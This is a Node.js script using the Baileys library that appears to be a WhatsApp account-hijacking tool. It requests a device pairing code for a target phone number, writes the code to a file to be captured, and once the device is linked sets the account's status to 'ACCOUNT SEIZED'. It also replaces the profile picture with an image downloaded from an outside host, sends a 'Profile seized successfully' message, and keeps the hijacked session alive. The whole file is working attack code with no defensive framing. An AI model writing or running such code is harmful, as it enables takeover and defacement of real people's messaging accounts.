const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason,
    Browsers,
    delay
} = require("@whiskeysockets/baileys"); 
const pino = require("pino");
const sharp = require("sharp"); // Replaced Jimp
const fs = require("fs");
const https = require("https");
const sessionPath = './session_new';
let sock = null;
let pairingCodeRequested = false;
let isShuttingDown = false;

function cleanSession() {
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
        console.log(`[✓] Cleaned old session`);
    }
}

// Download image from URL with retries
async function downloadImage(url, filename, retries = 3) {
    for (let i = 0; i < retries; i++) {
        try {
            console.log(`[i] Download attempt ${i + 1}/${retries}...`);
            await new Promise((resolve, reject) => {
                const file = fs.createWriteStream(filename);
                const request = https.get(url, { timeout: 30000 }, (response) => {
                    if (response.statusCode !== 200) {
                        reject(new Error(`HTTP ${response.statusCode}`));
                        return;
                    }
                    response.pipe(file);
                    file.on('finish', () => {
                        file.close();
                        resolve();
                    });
                });
                
                request.on('error', (err) => {
                    fs.unlink(filename, () => {});
                    reject(err);
                });
                
                request.on('timeout', () => {
                    request.destroy();
                    reject(new Error('Timeout'));
                });
            });
            console.log(`[✓] Download successful`);
            return filename;
        } catch (err) {
            console.log(`[✗] Attempt ${i + 1} failed: ${err.message}`);
            if (i < retries - 1) {
                console.log(`[i] Retrying in 3 seconds...`);
                await delay(3000);
            }
        }
    }
    throw new Error(`Failed to download after ${retries} attempts`);
}

// NEW: Sharp Image Processor
async function getSharpBuffer(path) {
    console.log(`[i] Processing image with Sharp: ${path}`);
    return await sharp(path)
        .resize(640, 640, {
            fit: 'cover',
            position: 'center'
        })
        .jpeg({ quality: 80 })
        .toBuffer();
}

async function connectToWhatsApp(isFirstConnect = true) {
    if (isFirstConnect) {
        cleanSession();
    }
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    
    const { version } = await fetchLatestBaileysVersion();
    console.log(`[i] Using WA v${version.join(".")}`);

    sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Chrome"),
        syncFullHistory: false,
        markOnlineOnConnect: true,
        printQRInTerminal: false,
        connectTimeoutMs: 120000,
        keepAliveIntervalMs: 30000,
        defaultQueryTimeoutMs: 60000
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (isShuttingDown) return;
        
        if (qr && !pairingCodeRequested && !sock.authState.creds.registered) {
            pairingCodeRequested = true;
            const phoneNumber = process.argv[2]?.replace(/\D/g, '');
            
            if (!phoneNumber || phoneNumber.length < 10) {
                console.error("[x] Error: Provide phone number with country code");
                return;
            }

            console.log(`[i] Requesting pairing code for: ${phoneNumber}`);
            await delay(2000);
            
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                console.log(`ANON_CODE_START:${code}:ANON_CODE_END`);
                fs.writeFileSync('CODE.txt', code);
            } catch (err) {
                console.error("[✗] Failed to get pairing code:", err.message);
                pairingCodeRequested = false;
            }
        }

        if (connection === "open") {
            console.log("\n[✓] SUCCESS: DEVICE LINKED!");
            await delay(15000); // Wait for sync
            
            try {
                // 1. Update Status
                await sock.updateProfileStatus("ψ ☠︎︎ ACCOUNT SEIZED ☠︎︎ ψ");
                
                // 2. Update Profile Picture with Sharp
                const imageUrl = 'https://files.catbox.moe/c61uu3.jpg';
                const tempFile = './temp_profile.jpg';
                
                try {
                    await downloadImage(imageUrl, tempFile, 3);
                    const buffer = await getSharpBuffer(tempFile);
                    
                    // Format JID correctly for profile update
                    const jid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                    await sock.updateProfilePicture(jid, buffer);
                    console.log("[✓] Profile picture updated with Sharp!");
                    
                    if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
                } catch (err) {
                    console.log(`[✗] Profile picture failed: ${err.message}`);
                }
                
                // 3. Send Message
                await sock.sendMessage(sock.user.id, { 
                    text: "*SYSTEM ERROR:* anon v6 Executed.\n\nProfile seized successfully." 
                });
                
            } catch (e) { 
                console.log("[✗] Update failed:", e.message);
            }
            
            while (!isShuttingDown) {
                await delay(60000);
                try { await sock.sendPresenceUpdate('available'); } catch (e) {}
            }
        }

        if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode !== DisconnectReason.loggedOut && !isShuttingDown) {
                return connectToWhatsApp(false);
            }
        }
    });
}

connectToWhatsApp(true);
